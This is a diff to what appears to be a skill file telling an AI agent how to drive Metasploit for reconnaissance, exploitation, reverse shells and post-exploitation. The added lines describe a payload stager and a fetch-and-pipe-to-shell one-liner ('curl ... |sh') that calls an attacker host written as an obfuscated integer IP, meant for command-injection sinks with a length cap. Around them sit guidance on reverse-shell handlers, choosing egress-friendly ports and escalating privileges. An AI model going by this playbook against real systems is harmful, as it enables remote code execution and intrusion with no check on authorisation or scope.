@@ -10,7 +10,7 @@ Drive msfconsole for recon, exploit, reverse shells, and post-ex. Syntax lives i
 
 ## Pre-attack wiki query (MANDATORY)
 Before firing any exploit module, query the fingerprinted tech/CVE: read `[[metasploit]]`
-directly for syntax, then `Skill(arsenal)` for the matching module/payload/technique. Never fire
+directly for syntax, then `Skill(wiki-arsenal)` for the matching module/payload/technique. Never fire
 a module from memory when a targeted lookup would confirm the right one/target index.
 
 ## Setup / DB
@@ -34,7 +34,16 @@ exploitability test beats a blind fire. Cheatsheet: Search and Selection + Optio
 `shell_reverse_tcp` when meterpreter is blocked or unstable, routine on hardened Windows/EDR.
 Delivery via `msfvenom` (ELF/EXE/ASPX/PHP, cheatsheet's MSFVenom section has every format).
 Egress-test the LPORT (80/443/53 before 4444). Background the handler correctly:
-`set ExitOnSession false; run -j` so it keeps catching new sessions. On the VM, `scripts/vm-handler.sh <eng> <lhost> [payload]` automates the LPORT choice: it reads the VM's listeners and picks the first FREE egress-friendly port (80/443/53/8000/8080), so the handler never fails to bind on a taken port nor silently picks a filtered high port; it launches in the engagement's `msf` tmux window and prints the LPORT to build the payload with.
+`set ExitOnSession false; run -j` so it keeps catching new sessions. On the VM,
+`bash scripts/vm-handler.sh <lhost> [tmux-session] [payload]` automates the LPORT choice: it reads
+the VM's listeners and picks the first FREE egress-friendly port (80/443/53/8000/8080), so the
+handler never fails to bind on a taken port nor silently picks a filtered high port; it launches
+in a VM tmux session (default name `msf`) and prints the LPORT to build the payload with.
+Second RCE channel for cmdi sinks (the web_delivery pattern, no module needed):
+`bash scripts/stager.sh <lhost> [port] <payload>` serves the payload over an egress-friendly
+HTTP port and prints the shortest fetch one-liner with the IPv4 pre-encoded as an integer
+(`curl -sm2 3232268500/r|sh`) for length-capped sinks; pair it with `vm-handler.sh` as the
+listener.
 
 ## Sessions / post-ex
 `sessions -i` to interact, `run post/multi/recon/local_exploit_suggester` is the privesc reflex
